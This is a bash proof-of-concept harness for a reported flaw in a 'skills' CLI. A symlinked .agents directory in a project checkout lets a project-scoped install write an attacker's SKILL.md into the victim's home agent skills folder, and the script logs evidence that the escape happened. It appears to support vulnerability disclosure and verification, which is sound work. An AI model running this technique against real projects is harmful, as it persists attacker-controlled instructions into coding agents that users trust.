#!/usr/bin/env bash
set -uo pipefail

FINDING_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="${REPO_ROOT:-$(cd "$FINDING_DIR/../../.." && pwd)}"
EVIDENCE_DIR="${EVIDENCE_DIR:-$FINDING_DIR/evidence}"
SETUP_SH="$EVIDENCE_DIR/setup.sh"
EXPLOIT_SH="$EVIDENCE_DIR/exploit.sh"
mkdir -p "$EVIDENCE_DIR"

json_result() {
  local status="$1" evidence="$2" notes="${3:-}"
  printf '{"status": "%s", "evidence": "%s", "notes": "%s"}\n' "$status" "$evidence" "$notes"
}

if [[ ! -f "$REPO_ROOT/src/cli.ts" ]]; then
  json_result "failed" "skills CLI source entrypoint missing" "set REPO_ROOT to the skills repository"
  exit 0
fi

{
  echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo "repo_root: $REPO_ROOT"
  echo "finding_dir: $FINDING_DIR"
  echo "os: $(uname -a)"
  echo "node: $(node --version 2>/dev/null || echo missing)"
  echo "pnpm: $(pnpm --version 2>/dev/null || echo missing)"
  echo "git: $(git --version 2>/dev/null || echo missing)"
  (cd "$REPO_ROOT" && echo "git_commit: $(git rev-parse --short HEAD 2>/dev/null || echo unknown)")
} > "$EVIDENCE_DIR/env-info.txt" 2>&1

export REPO_ROOT EVIDENCE_DIR

printf '[*] provisioning malicious project checkout with symlinked .agents base\n'
if ! bash "$SETUP_SH" > "$EVIDENCE_DIR/setup.log" 2>&1; then
  printf '[!] setup failed; see evidence/setup.log\n'
  json_result "failed" "setup failed before exploit" "see evidence/setup.log"
  exit 0
fi

if [[ ! -f "$EVIDENCE_DIR/run.env" ]]; then
  printf '[!] setup did not produce evidence/run.env\n'
  json_result "failed" "setup did not produce run.env" "see evidence/setup.log"
  exit 0
fi

# shellcheck source=/dev/null
source "$EVIDENCE_DIR/run.env"

if ! (
  set -euo pipefail
  echo "CLI version:"
  HOME="$VICTIM_HOME" \
  XDG_CONFIG_HOME="$VICTIM_HOME/.config" \
  XDG_STATE_HOME="$VICTIM_HOME/.local/state" \
  DISABLE_TELEMETRY=1 \
  NO_COLOR=1 \
  node "$REPO_ROOT/src/cli.ts" --version
  echo
  echo "Project checkout contains a symlinked project agent base:"
  cd "$VICTIM_PROJECT"
  pwd
  ls -l .agents
  printf 'readlink(.agents): '; readlink .agents
  printf 'realpath(.agents): '; realpath .agents
  echo
  if command -v git >/dev/null 2>&1; then
    echo "Git index proof that .agents is checkout-controlled symlink (mode 120000):"
    git ls-files -s .agents malicious-skill/SKILL.md || true
  fi
  echo
  echo "Pre-exploit global-like home skill path should be absent:"
  if [[ -e "$EXPECTED_HOME_SKILL" ]]; then
    echo "unexpected_present=$EXPECTED_HOME_SKILL"
    exit 1
  fi
  echo "absent=$EXPECTED_HOME_SKILL"
) > "$EVIDENCE_DIR/healthcheck.log" 2>&1; then
  printf '[!] healthcheck failed; see evidence/healthcheck.log\n'
  json_result "failed" "healthcheck failed before exploit" "see evidence/healthcheck.log"
  exit 0
fi

printf '[*] running project-scoped install through real skills CLI (no --global)\n'
if ! bash "$EXPLOIT_SH" > "$EVIDENCE_DIR/exploit.log" 2>&1; then
  printf '[!] exploit command failed; see evidence/exploit.log\n'
  json_result "failed" "project-scoped CLI install command failed" "see evidence/exploit.log"
  exit 0
fi

PROJECT_ROOT_REAL="$(realpath "$VICTIM_PROJECT" 2>/dev/null || printf '%s' "$VICTIM_PROJECT")"
PROJECT_SKILL_REAL="$(realpath "$PROJECT_LEXICAL_SKILL" 2>/dev/null || true)"
HOME_SKILL_REAL="$(realpath "$EXPECTED_HOME_SKILL" 2>/dev/null || true)"
ESCAPED="no"
case "$PROJECT_SKILL_REAL" in
  "$PROJECT_ROOT_REAL"/*) ESCAPED="no" ;;
  "") ESCAPED="missing" ;;
  *) ESCAPED="yes" ;;
esac

{
  echo "project_scope_command_no_global=node $REPO_ROOT/src/cli.ts add ./malicious-skill --agent codex --yes"
  echo "victim_project=$VICTIM_PROJECT"
  echo "victim_home=$VICTIM_HOME"
  echo "project_agents_symlink=$(readlink "$VICTIM_PROJECT/.agents")"
  echo "project_root_real=$PROJECT_ROOT_REAL"
  echo "lexical_project_skill=$PROJECT_LEXICAL_SKILL"
  echo "realpath_lexical_project_skill=$PROJECT_SKILL_REAL"
  echo "expected_home_skill=$EXPECTED_HOME_SKILL"
  echo "realpath_expected_home_skill=$HOME_SKILL_REAL"
  echo "escaped_project_root=$ESCAPED"
  echo
  echo "Installed payload files under victim home agent base:"
  find "$VICTIM_HOME/.agents" -maxdepth 4 -type f -print -exec sed -n '1,12p' {} \;
  echo
  echo "Installed SKILL.md content:"
  if [[ -f "$EXPECTED_HOME_SKILL" ]]; then
    cat "$EXPECTED_HOME_SKILL"
  else
    echo "missing"
  fi
} > "$EVIDENCE_DIR/impact.log" 2>&1

if [[ -f "$EXPECTED_HOME_SKILL" ]] \
  && [[ "$ESCAPED" == "yes" ]] \
  && grep -q "$PAYLOAD_MARKER" "$EXPECTED_HOME_SKILL" \
  && grep -q "$PAYLOAD_MARKER" "$VICTIM_HOME/.agents/skills/$PAYLOAD_NAME/payload-marker.txt"; then
  printf '[+] confirmed: project-scoped install wrote attacker skill outside project into victim home agent base\n'
  json_result "confirmed" "attacker skill persisted in victim-home .agents/skills outside project" "see evidence/impact.log"
else
  printf '[!] not confirmed: escaped payload was not observed\n'
  json_result "failed" "escaped project-scope install artifact not observed" "see evidence/impact.log"
fi
